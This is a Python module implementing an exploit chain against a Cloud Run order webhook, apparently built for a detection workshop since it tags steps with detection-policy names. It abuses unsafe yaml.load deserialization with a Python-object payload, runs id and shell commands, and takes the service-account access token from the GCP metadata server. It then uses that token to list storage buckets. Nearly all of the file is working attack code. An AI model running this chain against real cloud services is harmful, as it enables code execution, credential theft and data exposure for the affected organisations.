"""Checkout fulfillment YAML exploit chain — GCP Cloud Run order-webhook."""
from __future__ import annotations

import json
import os
import subprocess
from pathlib import Path
from typing import Any
from urllib.error import HTTPError, URLError
from urllib.request import Request, urlopen

WORKSHOP_MARKER = Path("/tmp/jss-order-yaml-chain.txt")
DEFAULT_YAML_PAYLOAD = "!!python/object/apply:builtins.eval\nargs: ['\"exploited\"']"
GCP_METADATA = "metadata.google.internal"


def _redact_token(token: str) -> str:
    if not token:
        return ""
    if len(token) <= 12:
        return token[:4] + "..."
    return f"{token[:8]}...{token[-4:]}"


def _run_proc(cmd: list[str], timeout: float = 12) -> dict[str, Any]:
    try:
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return {
            "command": cmd,
            "returncode": proc.returncode,
            "stdout": proc.stdout.strip(),
            "stderr": proc.stderr.strip(),
        }
    except Exception as exc:
        return {"command": cmd, "returncode": None, "error": str(exc)}


def _gcp_http_get(path: str) -> tuple[int, str]:
    url = f"http://{GCP_METADATA}{path}"
    req = Request(url, headers={"Metadata-Flavor": "Google"})
    with urlopen(req, timeout=5) as resp:
        return resp.status, resp.read().decode("utf-8")


def poisoned_manifest(body: dict) -> str | None:
    manifest = body.get("fulfillmentManifest") or body.get("shippingConfigYaml")
    if isinstance(manifest, str) and manifest.strip():
        return manifest
    return None


def exploit_yaml(payload: str) -> dict[str, Any]:
    import yaml

    try:
        result = yaml.load(payload, Loader=yaml.Loader)
        exploited = result == "exploited" or result is not None
        return {"success": True, "exploited": exploited, "result": str(result)}
    except Exception as exc:
        return {"success": False, "exploited": False, "error": str(exc)}


def _metadata_theft() -> dict[str, Any]:
    curl_probe = _run_proc(
        [
            "curl",
            "-s",
            "-H",
            "Metadata-Flavor: Google",
            f"http://{GCP_METADATA}/computeMetadata/v1/instance/service-accounts/default/email",
        ]
    )
    sa_email = ""
    token_redacted: dict[str, Any] = {}
    access_token = ""
    try:
        _, sa_email = _gcp_http_get("/computeMetadata/v1/instance/service-accounts/default/email")
        sa_email = sa_email.strip()
    except (HTTPError, URLError, TimeoutError, OSError) as exc:
        sa_email = f"error: {exc}"

    try:
        _, token_raw = _gcp_http_get(
            "/computeMetadata/v1/instance/service-accounts/default/token"
            "?scopes=https://www.googleapis.com/auth/cloud-platform"
        )
        token_payload = json.loads(token_raw)
        access_token = token_payload.get("access_token", "")
        token_redacted = {
            "access_token": _redact_token(access_token),
            "expires_in": token_payload.get("expires_in"),
            "token_type": token_payload.get("token_type"),
        }
    except (HTTPError, URLError, TimeoutError, OSError, json.JSONDecodeError) as exc:
        token_redacted = {"error": str(exc)}

    return {
        "step": 3,
        "action": "metadata_token_theft",
        "scope": "cloud-run-runtime",
        "metadata_host": GCP_METADATA,
        "service_account": sa_email,
        "token_redacted": token_redacted,
        "curl_metadata_process": curl_probe,
        "access_token_available": bool(access_token),
        "upwind": ["GCP credentials access", "Metadata server access"],
        "_access_token": access_token,
    }


def _gcs_enumeration(access_token: str) -> dict[str, Any]:
    project = os.getenv("GOOGLE_CLOUD_PROJECT") or os.getenv("GCP_PROJECT") or ""
    buckets: list[str] = []
    error = None
    if access_token and project:
        try:
            url = f"https://storage.googleapis.com/storage/v1/b?project={project}&maxResults=8"
            req = Request(url, headers={"Authorization": f"Bearer {access_token}"})
            with urlopen(req, timeout=8) as resp:
                payload = json.loads(resp.read().decode("utf-8"))
            buckets = [item["name"] for item in payload.get("items", [])]
        except (HTTPError, URLError, TimeoutError, OSError, json.JSONDecodeError, KeyError) as exc:
            error = str(exc)
    elif not project:
        error = "GOOGLE_CLOUD_PROJECT not set"
    else:
        error = "No metadata access token"

    return {
        "step": 4,
        "action": "gcs_enumeration",
        "project": project,
        "buckets": buckets,
        "error": error,
        "upwind": ["Cloud Audit Logs storage", "data exfiltration"],
    }


def run_checkout_chain(manifest: str) -> dict[str, Any]:
    chain: list[dict[str, Any]] = []

    yaml_result = exploit_yaml(manifest)
    chain.append(
        {
            "step": 1,
            "action": "yaml.load fulfillmentManifest in handle_checkout",
            "cve": "CVE-2020-14343",
            "pattern": "unsafe_deserialization",
            **yaml_result,
        }
    )

    id_step = _run_proc(["id", "-a"])
    marker_text = f"yaml-chain:{yaml_result.get('result')}\n{id_step.get('stdout', '')}\n"
    WORKSHOP_MARKER.write_text(marker_text, encoding="utf-8")
    chain.append(
        {
            "step": 2,
            "action": "post_exploit_identity_probe",
            "process": id_step,
            "marker_file": str(WORKSHOP_MARKER),
            "upwind": ["Process events", "Operating system utilities processes"],
        }
    )

    shell_pipe = _run_proc(["sh", "-c", f"id 2>&1 | tee -a {WORKSHOP_MARKER}"])
    chain.append(
        {
            "step": 2,
            "action": "shell_pipe_redirect",
            "process": shell_pipe,
            "upwind": ["Shell Process Redirect", "Custom Process rules"],
        }
    )

    metadata = _metadata_theft()
    access_token = metadata.pop("_access_token", "")
    chain.append(metadata)
    chain.append(_gcs_enumeration(access_token))

    exploited = bool(yaml_result.get("exploited"))
    return {
        "exploited": exploited,
        "pattern": "checkout_fulfillment_yaml_chain",
        "cve": "CVE-2020-14343",
        "scope": "order-webhook-cloud-run",
        "chain": chain,
        "narrative": (
            "Attacker submits a normal-looking checkout with a poisoned fulfillmentManifest. "
            "The order-webhook parses it with yaml.load(), gains code execution, spawns id/shell "
            "for tracer Process events, curls the metadata server, and enumerates GCS buckets."
        ),
        "upwind_policies": [
            "CVE-2020-14343 / unsafe deserialization",
            "Shell Process Redirect",
            "GCP credentials access",
            "Cloud Audit Logs storage",
        ],
    }
